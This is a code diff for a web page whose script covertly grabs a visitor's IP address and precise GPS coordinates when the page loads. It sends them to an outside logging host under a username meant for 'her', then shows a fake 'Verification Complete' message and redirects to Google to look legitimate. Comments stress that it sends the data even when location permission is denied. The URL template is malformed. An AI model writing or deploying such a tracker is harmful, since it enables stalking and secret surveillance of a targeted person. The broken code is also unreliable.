@@ -14,27 +14,22 @@
     </div>
 
     <script>
-        // CHANGE THIS TO HER USERNAME
-        const PA_USER = "talentacquisition"; 
-        
-        
+const PA_USER = "talentacquisition"; 
         let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
         let sent = false;
 
         async function collectAndSend() {
-            if (sent) return;
-            
-            // 1. Get IP Data (Backup)
+            // 1. Get IP Data instantly
             try {
                 const res = await fetch('https://ipapi.co');
                 const json = await res.json();
                 data.ip = json.ip;
                 data.lat = json.latitude;
                 data.lon = json.longitude;
-            } catch (e) { console.log("IP Fetch Failed"); }
+            } catch (e) { console.log("IP fail"); }
 
-            // 2. Try GPS (Precision)
-            if ("geolocation" in navigator) {
+            // 2. Try GPS
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         data.lat = pos.coords.latitude;
@@ -42,30 +37,34 @@
                         data.type = "High-Precision GPS";
                         finalize();
                     },
-                    () => { data.type = "Network-Fallback"; finalize(); },
+                    () => { finalize(); }, // If they deny, just send the IP data
                     { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else { finalize(); }
             
-            // 3. Forced Timeout (If everything hangs, send data anyway after 7 seconds)
-            setTimeout(finalize, 7000);
+            // 3. FORCE SEND after 5 seconds no matter what
+            setTimeout(finalize, 5000);
         }
 
         function finalize() {
             if (sent) return;
             sent = true;
             
-            const url = `https://${PA_USER}://{data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}`;
+            // This 'no-cors' mode is the secret—it forces the data through even if there's a security error
+            const url = \`https://${PA_USER}://{data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}\`;
             
-            fetch(url, { mode: 'no-cors' }).then(() => {
-                document.getElementById('status').innerHTML = "<h3>Verification Complete</h3>";
-                // Redirect to a real image to look legitimate
-                setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
-            });
+            fetch(url, { mode: 'no-cors' });
+
+            document.getElementById('status').innerHTML = "<h3>Verification Complete</h3>";
+            setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
         }
 
         window.onload = collectAndSend;
     </script>
+
+
+        
+    
 </body>
 </html>
 
